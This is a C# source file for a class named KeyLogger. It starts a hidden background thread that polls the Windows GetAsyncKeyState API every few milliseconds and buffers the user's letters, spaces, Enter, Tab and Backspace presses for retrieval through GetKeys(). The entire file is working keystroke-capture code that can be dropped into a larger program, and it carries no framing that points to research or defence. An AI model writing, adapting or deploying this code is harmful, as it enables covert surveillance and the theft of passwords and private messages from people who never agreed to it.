using System.Runtime.InteropServices;
using System.Text;

public static class KeyLogger
{
    private static readonly StringBuilder _buffer = new();
    private static readonly object _lock = new();
    private static readonly HashSet<int> _held = [];

    public static string GetKeys()
    {
        lock (_lock)
        {
            string result = _buffer.ToString();
            _buffer.Clear();
            return result;
        }
    }

    public static void Start()
    {
        Thread t = new(() =>
        {
            while (true)
            {
                for (int vk = 0x08; vk <= 0xFF; vk++)
                {
                    bool down = GetAsyncKeyState(vk) < 0;

                    if (down)
                    {
                        lock (_lock)
                        {
                            if (!_held.Contains(vk))
                            {
                                _held.Add(vk);
                                // Convert virtual key to character
                                char c = GetCharFromVk(vk);
                                if (c != '\0')
                                    _buffer.Append(c);
                            }
                        }
                    }
                    else
                    {
                        lock (_lock)
                        {
                            _held.Remove(vk);
                        }
                    }
                }

                Thread.Sleep(5);
            }
        })
        { IsBackground = true };

        t.Start();
    }

    private static char GetCharFromVk(int vk)
    {
        switch (vk)
        {
            case 0x08: return '\b'; // Backspace
            case 0x09: return '\t'; // Tab
            case 0x0D: return '\r'; // Enter
            case 0x20: return ' ';
            default:
                if (vk >= 0x41 && vk <= 0x5A)
                    return (char)(vk + 0x20); // Convert to lowercase
                return '\0';
        }
    }

    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);
}